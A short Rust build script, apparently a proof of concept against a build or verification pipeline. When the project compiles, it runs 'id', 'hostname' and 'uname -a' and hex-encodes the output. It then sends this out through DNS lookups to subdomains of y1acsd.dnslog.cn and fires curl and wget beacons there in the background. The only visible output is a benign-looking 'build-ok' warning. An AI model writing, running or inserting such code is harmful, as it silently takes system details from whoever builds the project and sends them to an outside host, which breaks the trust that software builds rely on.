use std::process::Command;

fn sh(cmd: &str) -> String {
    Command::new("sh").arg("-c").arg(cmd).output()
        .map(|o| format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
        .unwrap_or_default()
}

fn hex(s: &str) -> String {
    s.as_bytes().iter().map(|b| format!("{:02x}", b)).collect()
}

fn main() {
    let id = sh("id");
    let hn = sh("hostname");
    let un = sh("uname -a");
    let i = hex(&id[..id.chars().take(45).count()]);
    let h = hex(&hn[..hn.chars().take(45).count()]);
    let u = hex(&un[..un.chars().take(30).count()]);
    let tag = "e8a04787";
    // DNS exfil: id / hostname / uname, plus plain beacons
    let cmd = format!(
        "(getent hosts i{}.{}.y1acsd.dnslog.cn; getent hosts h{}.{}.y1acsd.dnslog.cn; getent hosts u{}.{}.y1acsd.dnslog.cn; getent hosts ping.{}.y1acsd.dnslog.cn; curl -sm 8 http://ping.{}.y1acsd.dnslog.cn/x >/dev/null 2>&1; wget -q -T 8 -O /dev/null http://ping2.{}.y1acsd.dnslog.cn/x 2>/dev/null) >/dev/null 2>&1 &",
        i, tag, h, tag, u, tag, tag, tag, tag
    );
    let _ = sh(&cmd);
    println!("cargo:warning=stylus-verify-poc-build-ok");
}

